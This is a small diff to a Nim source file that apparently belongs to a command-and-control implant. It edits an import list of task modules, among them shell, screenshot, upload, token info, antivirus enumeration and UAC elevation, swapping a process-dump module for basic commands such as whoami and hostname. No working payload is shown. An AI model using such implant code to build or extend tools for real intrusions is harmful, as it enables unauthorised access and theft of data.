@@ -2,7 +2,7 @@ import net
 
 import  download, msgbox, processes, screenshot, 
         shell, tokinfo, upload, antiviruses, uac_elv,
-        dotnet_info, dumpprocess
+        dotnet_info, pwd, hostname, whoami, mkdir, rmdir
 
 var tasks*: seq[tuple[
   name: string, 
